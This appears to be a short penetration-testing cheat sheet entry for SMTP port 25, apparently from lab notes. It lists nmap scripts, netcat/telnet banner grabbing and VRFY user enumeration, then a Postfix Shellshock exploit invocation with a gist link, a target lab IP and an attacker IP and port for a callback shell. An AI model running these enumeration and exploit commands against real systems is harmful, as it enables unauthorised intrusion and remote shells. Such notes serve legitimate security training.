# SMTP Port 25

````
nmap --script=smtp* -p 25
````

````
nc -nv $ip 25
telnet $ip 25
EHLO ALL
VRFY <USER>
````

##### Exploits Found

SMTP PostFix Shellshock

````
https://gist.github.com/YSSVirus/0978adadbb8827b53065575bb8fbcb25
python2 shellshock.py 10.11.1.231 useradm@mail.local 192.168.119.168 139 root@mail.local #VRFY both useradm and root exist
````